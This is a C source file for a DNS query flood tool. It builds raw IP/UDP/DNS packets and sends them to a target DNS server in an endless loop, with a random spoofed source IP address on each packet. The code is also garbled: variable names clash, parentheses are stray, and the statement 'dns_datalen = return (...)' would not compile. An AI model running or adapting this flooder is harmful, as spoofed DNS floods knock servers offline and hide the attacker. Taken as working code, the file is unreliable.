#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/wait.h>
#include <getopt.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

struct dnshdr {
	unsigned short int id;
	unsigned char rd:1;				
	unsigned char tc:1;				
	unsigned char aa:1;				
	unsigned char opcode:4;			
    unsigned char qr:1;				
	unsigned char rcode:4;			
	unsigned char unused:2;			
	unsigned char pr:1;				
	unsigned char ra:1;				
	unsigned short int que_num;
	unsigned short int rep_num;
	unsigned short int num_rr;
	unsigned short int num_rrsup;
};

int main(int argc, char **argv){
	char quary_name[256] = {0};													
	int sock;
	int random_ip = 0;
	int static_ip = 0;
    struct in_addr source_ip = {0};											
	struct sockaddr_in sin_destination = {0};										
	u_short source_port = 0;													
	u_short destination_port = 53;													
	random_ip = 1;//for ip spoofing if random_id-->1 else not ip spoofing															
	srandom((unsigned long)time(NULL));
	const int on = 1;
	char *from, *to;
	int itmp = 0;
	unsigned char packet[2048] = {0};
	struct ip *iphdr;
	struct udphdr *udp;
	struct dnshdr *dns_header;
	char *dns_data;
	strcpy(quary_name, argv[0]);
	inet_pton(AF_INET, argv[1], &sin_dst.sin_addr);
	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) ;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)));
	sin_destination.sin_family = AF_INET;
	sin_destination.sin_port = htons(dst_port);
	iphdr = (struct ip *)packet;
	udp = (struct udphdr *)((char *)iphdr + sizeof(struct ip));
	dns_header = (struct dnshdr *)((char *)udp + sizeof(struct udphdr));
	dns_data = (char *)((char *)dns_header + sizeof(struct dnshdr));
	dns_header->rd = 1;
	dns_header->que_num = htons(1);
	dns_header->qr = 0;	
	dns_header->aa = 0;			
	dns_header->rep_num = htons(0);	
	udp->uh_dport = htons(dst_port);
	if (src_port) {
		udp->uh_sport = htons(src_port);
	}
	iphdr->ip_dst.s_addr = sin_dst.sin_addr.s_addr;
	iphdr->ip_v = IPVERSION;
	iphdr->ip_hl = sizeof(struct ip) >> 2;
	iphdr->ip_ttl = 245;
	iphdr->ip_p = IPPROTO_UDP;
    //make packet and notification to dns server 
	while (1) {
		int dns_datalen;
		int udp_datalen;
		int ip_datalen;
		ssize_t ret;
        if (random_ip) {
			src_ip.s_addr = random(); 
		}
        dns_header->id = random();
        *((u_short *) (dns_data + strlen(dns_data) + 1)) = htons(1);
	    *((u_short *) (dns_data + strlen(dns_data) + 3)) = htons(1);
		dns_datalen = return (strlen(dns_data) + 5);
        udp_datalen = sizeof(struct dnshdr) + dns_datalen;
		ip_datalen = sizeof(struct udphdr) + udp_datalen;
        iphdr->ip_src.s_addr = src_ip.s_addr;
		iphdr->ip_id = random() % 5985;
		iphdr->ip_len = sizeof(struct ip) + ip_datalen;
		iphdr->ip_sum = 0;
		if (!src_port) {
			udp->uh_sport = htons(random() % 65535);
		}
		udp->uh_ulen = htons(sizeof(struct udphdr) + udp_datalen);
		udp->uh_sum = 0;
		sendto(sock, iphdr, sizeof(struct ip) + ip_datalen, 0,(struct sockaddr *) &sin_dst, sizeof(struct sockaddr));//sending dna query
	}
	return 0;
}
